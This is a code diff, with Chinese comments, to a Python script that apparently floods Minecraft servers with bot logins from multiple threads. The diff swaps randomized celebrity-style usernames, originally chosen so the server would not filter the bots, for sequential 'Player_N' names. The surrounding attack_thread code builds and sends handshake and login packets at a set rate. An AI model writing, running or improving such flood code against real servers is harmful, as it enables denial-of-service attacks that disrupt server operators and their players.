@@ -124,18 +124,16 @@ print(f"[*] 每线程每秒连接数: {conn_rate}")
 # 协议版本 (1.18.1 = 757, 1.19 = 759, 1.20.4 = 765) 使用757较常见
 PROTOCOL_VERSION = 757
 
-# 假人用户名池 (随机化，避免固定 "Bot" 被服务器直接过滤)
-FAKE_NAMES = [
-    "Steve", "Alex", "Notch", "Herobrine", "Dream", "Techno",
-    "Tommy", "Tubbo", "Ranboo", "Purpled", "George", "Sapnap",
-    "Karl", "Quackity", "Wilbur", "Philza", "Skeppy", "BBH",
-    "Antfrost", "Punz", "Sam", "Foolish", "Eret", "Niki",
-    "Jack", "Connor", "Slime", "Ludwig", "Ninja", "Shroud",
-]
+# 假人用户名计数器 (全局递增，格式: Player_1, Player_2, ...)
+bot_counter = 0
+bot_counter_lock = threading.Lock()
 
-def random_bot_name():
-    # 生成随机假人用户名
-    return f"{random.choice(FAKE_NAMES)}{random.randint(1, 9999)}"
+def next_bot_name():
+    # 生成格式为 Player_N 的假人用户名，方便区分真假玩家
+    global bot_counter
+    with bot_counter_lock:
+        bot_counter += 1
+        return f"Player_{bot_counter}"
 
 def create_handshake_packet(host, port, next_state=2):
     # 构造 Minecraft Handshake 数据包
@@ -201,7 +199,7 @@ def attack_thread(host, port, ip, rate):
             sock.settimeout(5)
             sock.connect((ip, port))
             # 构造并发送 Handshake + Login Start
-            username = random_bot_name()
+            username = next_bot_name()
             handshake = create_handshake_packet(host, port, 2)
             login_start = create_login_start_packet(username)
             payload = handshake + login_start
